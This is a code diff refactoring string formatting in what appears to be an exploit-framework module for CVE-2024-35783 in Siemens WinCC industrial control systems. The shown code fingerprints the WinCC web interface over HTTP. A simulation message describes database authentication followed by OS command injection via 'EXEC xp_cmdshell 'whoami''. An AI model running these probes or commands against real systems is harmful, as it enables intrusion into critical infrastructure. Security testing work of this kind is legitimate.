@@ -56,11 +56,11 @@ _WINCC_STATUS_PATHS = [
 def _http_get(target: str, port: int, path: str, timeout: int) -> tuple:
     """Perform a minimal raw HTTP GET and return (status_code, body_bytes)."""
     request = (
-        "GET {} HTTP/1.0\r\n"
-        "Host: {}:{}\r\n"
+        f"GET {path} HTTP/1.0\r\n"
+        f"Host: {target}:{port}\r\n"
         "Connection: close\r\n"
         "\r\n"
-    ).format(path, target, port).encode()
+    ).encode()
 
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -153,12 +153,12 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would authenticate to {}:{} as a WinCC/historian database user, "
+                    f"Would authenticate to {self.target}:{self.port} as a WinCC/historian database user, "
                     "then execute a stored procedure or SQL batch with an injected OS "
                     "command (xp_cmdshell or equivalent). CVE-2024-35783 (CVSS 7.2) — "
                     "authenticated DB-level access escalates to OS-level SYSTEM on the "
                     "historian server. Affects WinCC V7.4/7.5/8.0, PCS 7 V9.1, "
-                    "SIMATIC Process Historian 2020/2022.".format(self.target, self.port)
+                    "SIMATIC Process Historian 2020/2022."
                 ),
                 payload_hex=(
                     "SQL: EXEC xp_cmdshell 'whoami' -- or equivalent "
@@ -172,18 +172,14 @@ class Exploit(Exploit):
             )
             return
 
-        print_status("[CVE-2024-35783] Probing WinCC web interface on {}:{}...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2024-35783] Probing WinCC web interface on {self.target}:{self.port}...")
         found = False
         for path in _WINCC_STATUS_PATHS:
             result = _http_get(self.target, self.port, path, self.timeout)
             code, body = result[0], result[1]
             is_wincc = result[2]
             if code > 0:
-                print_info("[CVE-2024-35783] {} returned HTTP {} ({} B)".format(
-                    path, code, len(body)
-                ))
+                print_info(f"[CVE-2024-35783] {path} returned HTTP {code} ({len(body)} B)")
                 if is_wincc:
                     print_success(
                         "[CVE-2024-35783] WinCC/Siemens fingerprint detected in response headers!"
@@ -197,6 +193,4 @@ class Exploit(Exploit):
                 "authenticated DB access may allow OS command injection (CVE-2024-35783)."
             )
         else:
-            print_error("[CVE-2024-35783] WinCC web interface not detected on {}:{}.".format(
-                self.target, self.port
-            ))
+            print_error(f"[CVE-2024-35783] WinCC web interface not detected on {self.target}:{self.port}.")
